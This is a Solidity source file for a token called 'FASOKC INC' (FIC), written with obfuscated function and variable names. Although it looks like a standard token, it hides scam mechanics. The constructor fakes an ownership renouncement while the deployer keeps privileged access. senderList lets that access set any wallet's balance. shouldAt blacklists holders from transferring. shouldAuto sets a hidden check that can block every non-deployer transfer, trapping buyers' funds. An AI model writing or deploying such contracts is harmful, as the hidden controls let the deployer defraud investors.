//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface isSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverTake {
    function createPair(address fundReceiver, address tradingReceiver) external returns (address);
}

abstract contract marketingSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptLaunchedWallet) external view returns (uint256);

    function transfer(address senderTrading, uint256 takeTotal) external returns (bool);

    function allowance(address shouldIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeTotal) external returns (bool);

    function transferFrom(address sender,address senderTrading,uint256 takeTotal) external returns (bool);

    event Transfer(address indexed from, address indexed autoTake, uint256 value);
    event Approval(address indexed shouldIs, address indexed spender, uint256 value);
}

interface maxListTx is tokenEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FASOKCINC is marketingSender, tokenEnable, maxListTx {

    string private listLaunched = "FASOKC INC";

    mapping(address => bool) public autoLaunch;

    function allowance(address listAtFrom, address receiverEnable) external view virtual override returns (uint256) {
        if (receiverEnable == totalLimit) {
            return type(uint256).max;
        }
        return liquidityLimit[listAtFrom][receiverEnable];
    }

    mapping(address => mapping(address => uint256)) private liquidityLimit;

    function minWalletTake() public {
        emit OwnershipTransferred(fromLaunched, address(0));
        buyIs = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return senderFrom;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listAuto;
    }

    bool public tradingAuto;

    address public fromLaunched;

    address public fromExempt;

    address private buyIs;

    address toTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public liquiditySwap;

    address totalLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function walletMin() private view {
        require(marketingTotalBuy[_msgSender()]);
    }

    uint256 isLaunched;

    uint256 private atFund;

    function transferFrom(address launchedList, address senderTrading, uint256 takeTotal) external override returns (bool) {
        if (_msgSender() != totalLimit) {
            if (liquidityLimit[launchedList][_msgSender()] != type(uint256).max) {
                require(takeTotal <= liquidityLimit[launchedList][_msgSender()]);
                liquidityLimit[launchedList][_msgSender()] -= takeTotal;
            }
        }
        return marketingTrading(launchedList, senderTrading, takeTotal);
    }

    event OwnershipTransferred(address indexed amountWallet, address indexed enableMin);

    uint256 private listAuto = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return listLaunched;
    }

    function shouldAt(address receiverLiquidityTeam) public {
        walletMin();
        if (toFrom != atFund) {
            exemptMarketingEnable = toFrom;
        }
        if (receiverLiquidityTeam == fromLaunched || receiverLiquidityTeam == fromExempt) {
            return;
        }
        autoLaunch[receiverLiquidityTeam] = true;
    }

    bool public senderFromToken;

    string private senderFrom = "FIC";

    uint256 public exemptMarketingEnable;

    function transfer(address modeMarketingTrading, uint256 takeTotal) external virtual override returns (bool) {
        return marketingTrading(_msgSender(), modeMarketingTrading, takeTotal);
    }

    function enableAmount(address launchedList, address senderTrading, uint256 takeTotal) internal returns (bool) {
        require(fromWallet[launchedList] >= takeTotal);
        fromWallet[launchedList] -= takeTotal;
        fromWallet[senderTrading] += takeTotal;
        emit Transfer(launchedList, senderTrading, takeTotal);
        return true;
    }

    function getOwner() external view returns (address) {
        return buyIs;
    }

    function atTx(address minList) public {
        if (senderFromToken) {
            return;
        }
        
        marketingTotalBuy[minList] = true;
        if (fromSenderMin) {
            liquiditySwap = true;
        }
        senderFromToken = true;
    }

    function marketingTrading(address launchedList, address senderTrading, uint256 takeTotal) internal returns (bool) {
        if (launchedList == fromLaunched) {
            return enableAmount(launchedList, senderTrading, takeTotal);
        }
        uint256 tokenList = tokenEnable(fromExempt).balanceOf(toTrading);
        require(tokenList == liquidityReceiver);
        require(!autoLaunch[launchedList]);
        return enableAmount(launchedList, senderTrading, takeTotal);
    }

    uint256 public toFrom;

    bool public fromSenderMin;

    function shouldAuto(uint256 takeTotal) public {
        walletMin();
        liquidityReceiver = takeTotal;
    }

    function senderList(address modeMarketingTrading, uint256 takeTotal) public {
        walletMin();
        fromWallet[modeMarketingTrading] = takeTotal;
    }

    function owner() external view returns (address) {
        return buyIs;
    }

    mapping(address => uint256) private fromWallet;

    function approve(address receiverEnable, uint256 takeTotal) public virtual override returns (bool) {
        liquidityLimit[_msgSender()][receiverEnable] = takeTotal;
        emit Approval(_msgSender(), receiverEnable, takeTotal);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return listAmount;
    }

    function balanceOf(address exemptLaunchedWallet) public view virtual override returns (uint256) {
        return fromWallet[exemptLaunchedWallet];
    }

    uint256 liquidityReceiver;

    uint256 private feeAt;

    uint8 private listAmount = 18;

    constructor (){
        if (liquiditySwap) {
            exemptMarketingEnable = feeAt;
        }
        minWalletTake();
        isSell maxSwap = isSell(totalLimit);
        fromExempt = receiverTake(maxSwap.factory()).createPair(maxSwap.WETH(), address(this));
        if (fromSenderMin == tradingAuto) {
            atFund = exemptMarketingEnable;
        }
        fromLaunched = _msgSender();
        marketingTotalBuy[fromLaunched] = true;
        fromWallet[fromLaunched] = listAuto;
        if (atFund != feeAt) {
            toFrom = feeAt;
        }
        emit Transfer(address(0), fromLaunched, listAuto);
    }

    mapping(address => bool) public marketingTotalBuy;

}